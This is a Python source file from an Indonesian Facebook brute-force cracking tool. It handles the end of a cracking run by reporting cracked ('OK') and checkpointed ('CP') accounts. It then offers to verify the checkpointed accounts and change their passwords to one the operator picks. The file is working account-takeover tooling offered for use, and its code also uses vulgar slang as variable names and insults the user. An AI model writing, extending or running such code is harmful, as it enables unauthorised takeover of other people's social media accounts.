#######################################################
# Name           : Brute Facebook (BF)                #
# File           : selesai.py                         #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############


import requests as r, time

from data import cek as toz
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

class Selesai_crack:
    def __init__(self, ok, cp):
        self.pwBaru, self.ubahP = [], []
        self.ok, self.cp = ok, cp
        self.hasil()
    
    def hasil(self):
        if len(self.ok) != 0 or len(self.cp) != 0:
            print("")
            prints(Panel(f"[[bold green]+[/]] Hasil OK : [bold green]{len(self.ok)}[/]  [[bold red]-[/]] Hasil CP : [bold yellow]{len(self.cp)}[/]",title="[bold green]PROSES[/] [bold yellow]SELESAI[/]"))
            cek_cp = input(f"  [{O}?{N}] munculkan opsi checkpoint detedtor [Y/t]: ")
            if cek_cp =="":
                print(f"\n  [{M}!{N}] jangan kosong");self.hasil()
            elif cek_cp in["Y","y"]:
                prints(Panel("🤗 Hidupkan mode pesawat 5 detik."));time.sleep(5)
                ww=input(f"\n  [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
                if ww in["Y","y"]:
                    self.ubahP.append("y")
                    print(f"  [{H}•{N}] contoh password : {H}yayanxd{N}")
                    pwBar=input(f"\n  [{H}+{N}] masukan password baru : ")
                    print("\n")
                    if len(pwBar) <= 5:
                        print(f'  {N}[{M}×{N}] kata sandi minimal 6 karakter')
                    else:
                        self.pwBaru.append(pwBar)
                for memek in self.cp:
                    kontol = memek.replace('\n', '')
                    titid  = kontol.split('|')
                    try:
                        toz.Cek_has().log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                    except r.exceptions.ConnectionError:
                        continue
                    print("")
                print("")
                prints(Panel(f'    {H}Proses Pengecekan Selesai '));exit()
            elif cek_cp in["T","t"]:
                exit(f"   {O}*{N} Selamat tinggal:)")
            else:
                print(f"  [{M}!{N}] Y/t goblok");self.hasil()
        else:
            exit(f'  [{M}!{N}] opshh kamu tidak mendapatkan hasil :(')